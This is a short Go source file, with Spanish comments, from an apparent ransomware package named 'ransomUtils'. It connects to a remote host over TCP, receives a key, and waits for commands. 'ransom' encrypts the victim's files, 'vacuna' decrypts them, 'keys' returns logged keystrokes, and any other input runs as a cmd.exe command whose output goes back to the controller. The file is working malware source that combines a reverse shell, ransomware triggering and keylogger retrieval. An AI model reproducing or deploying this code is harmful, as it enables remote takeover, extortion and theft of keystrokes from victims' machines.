package ransomUtils

import (
	"bufio"
	"net"
	"os/exec"
	"strings"
)

func ConectarClave(host string) (string, net.Conn, *bufio.Reader, error) {
	con, err := net.Dial("tcp", host)
	if err != nil {
		return "", nil, nil, err
	}

	con.Write([]byte("Introduzca la clave: "))

	re := bufio.NewReader(con)

	palabra, err := re.ReadString('\n')
	if err != nil {
		con.Close()
		return "", nil, nil, err
	}

	return strings.TrimSpace(palabra), con, re, nil
}

func EsperarComandos(con net.Conn, re *bufio.Reader, host string, key string) {
	for {
		cp, err := re.ReadString('\n')
		if err != nil {
			con.Close()
			return
		}

		var salida []byte
		var salidaVerbosa []byte

		switch strings.TrimSpace(cp) {
		case "ransom":
			salidaVerbosa = []byte(Atacar(key)) //no lo imprimo para no saturar pero es interesante poder verlo
			_ = salidaVerbosa
			salida = []byte("Cifrado completado")
		case "vacuna":
			salidaVerbosa = []byte(Curar(key)) //no lo imprimo para no saturar pero es interesante poder verlo
			_ = salidaVerbosa
			salida = []byte("Descifrado completado")
		case "keys":
			//parte opcional: pedir teclas registradas
			salida = []byte(VaciarTeclas())
		default:
			//si no es ninguno de los dos que se ejecute el comando
			cmd := exec.Command("cmd.exe", "/C", strings.TrimSpace(cp))
			salida, _ = cmd.CombinedOutput()
			if len(salida) == 0 {
				salida = []byte("(sin salida)")
			}
		}

		salida = append(salida, '\n')
        con.Write(salida)
	}
}
